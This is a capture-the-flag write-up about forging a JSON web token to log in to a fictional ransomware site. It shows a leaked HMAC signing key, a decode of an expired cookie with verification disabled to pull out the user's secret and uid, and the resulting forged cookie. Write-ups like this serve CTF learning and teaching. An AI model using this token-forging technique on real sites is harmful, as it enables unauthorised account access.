# Task 6

## Background
> We've found the login page on the ransomware site, but we don't know anyone's username or password. Luckily, the file you recovered from the attacker's computer looks like it could be helpful.
>
> Generate a new token value which will allow you to access the ransomware site.
> ### Prompt
> Enter a token value which will authenticate you as a user of the site.

## Writeup
TL;DR: Retrieve `sec` and `uid` from the decoded cookie file from task 5 and generate a new JWT with an expiration date in the future.

From the cookie file in task 5, we can see that this cookie's name is `tok`. Looking back at the server files retrieved in task B2, this cookie is a [JSON web token (JWT)](https://en.wikipedia.org/wiki/JSON_Web_Token) issued by the server to authenticate the user. These cookies are generated by `generate_token` in `util.py`.
```python
def generate_token(userName):
	""" Generate a new login token for the given user, good for 30 days"""
	with userdb() as con:
		row = con.execute("SELECT uid, secret from Accounts WHERE userName = ?", (userName,)).fetchone()
		now = datetime.now()
		exp = now + timedelta(days=30)
		claims = {'iat': now,
		          'exp': exp,
				  'uid': row[0],
				  'sec': row[1]}
		return jwt.encode(claims, hmac_key(), algorithm='HS256')
```
where `hmac_key()` is defined as
```python
def hmac_key():
	return "mnkor8J5UOeJKAqN2yx9MOkDOehyDKdt"
```

Unfortunately, we don't have the database to retrieve `uid` and `sec`. However, we do have a previously valid example: the cookie from task 5! We can decode it, using the correct parameters, to get the plaintext claims back out of it (we need to disable expiration verification since the cookie has already expired).
```python
>>> import jwt
>>> jwt.decode("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTI4MjY4MDgsImV4cCI6MTY1NTQxODgwOCwic2VjIjoicmFaUnR1dDJQNHVOZHYySjVsTmI2WmJqR21pUXdQUXkiLCJ1aWQiOjE2OTYzfQ.VGKRAm6p6e3Z0DM7wPohSyfSDgNMqsRIzS2cWpmhBPM", "mnkor8J5UOeJKAqN2yx9MOkDOehyDKdt", algorithm='HS256', options={'verify_exp':False})
{'iat': 1652826808, 'exp': 1655418808, 'sec': 'raZRtut2P4uNdv2J5lNb6ZbjGmiQwPQy', 'uid': 16963}
```

Now that we know the attacker's secret and uid, we can easily forge a new token.
```
$ python3 forge_token.py 16963
# Netscape HTTP Cookie File
xekflqhmhrsoelot.ransommethis.net	FALSE	/	TRUE	2145916800	tok	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjAyMzgwMzQsImV4cCI6MTY2MjgzMDAzNCwidWlkIjoxNjk2Mywic2VjIjoicmFaUnR1dDJQNHVOZHYySjVsTmI2WmJqR21pUXdQUXkifQ.aSnQHsGETQdqKj9ziprfoHxWt1_sg5_lqsaowWA8I4I 
```

Putting the cookie value into the answer box, we get our task 6 badge!